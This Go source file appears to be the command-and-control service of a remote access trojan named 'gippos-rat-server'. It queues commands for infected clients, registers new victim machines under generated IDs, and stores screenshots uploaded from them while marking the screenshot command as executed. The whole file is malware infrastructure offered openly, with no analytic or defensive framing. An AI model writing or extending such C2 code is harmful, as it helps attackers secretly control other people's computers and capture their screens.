package service

import (
	"gippos-rat-server/internal/model"
	"time"

	"github.com/google/uuid"
	"gorm.io/gorm"
)

type ServiceC2 struct {
	Storage *gorm.DB
}

func NewServiceC2(db *gorm.DB) *ServiceC2 {
	return &ServiceC2{Storage: db}
}

func (s *ServiceC2) AddCommand(clientID, cmdName string) *model.Command {
	cmd := &model.Command{
		ClientID:  clientID,
		Command:   cmdName,
		Timestamp: time.Now(),
		Status:    "pending",
	}
	s.Storage.Create(cmd)
	return cmd
}

func (s *ServiceC2) SaveScreenshot(clientID, filename string, filesize int64) {
	file := &model.ClientFile{
		ClientID:  clientID,
		FileName:  filename,
		FilePath:  "./uploads/" + filename,
		FileType:  "screenshot",
		FileSize:  filesize,
		Timestamp: time.Now(),
	}
	s.Storage.Create(file)

	s.Storage.Model(&model.Command{}).
		Where("client_id = ? AND command = ?", clientID, "upload_screenshot").
		Update("status", "executed")
}

func (s *ServiceC2) RegisterClient() (string, error) {
	clientID := uuid.New().String()

	client := model.Client{
		ID:        clientID,
		CreatedAt: time.Now(),
		LastSeen:  time.Now(),
	}

	if err := s.Storage.Create(&client).Error; err != nil {
		return "", err
	}

	return clientID, nil
}
